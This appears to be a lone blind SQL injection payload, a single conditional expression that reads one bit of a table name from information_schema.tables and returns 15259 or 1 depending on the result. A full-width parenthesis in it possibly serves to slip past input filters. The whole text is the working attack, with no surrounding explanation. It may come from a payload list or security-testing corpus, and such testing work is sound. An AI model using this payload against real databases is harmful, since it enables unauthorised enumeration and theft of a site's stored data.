if （(select (substr(lpad(bin(ord(substr(table_name, 1, 1))),8,0),1,1)) from information_schema.tables order by table_type limit 1) = 1, 15259, 1)
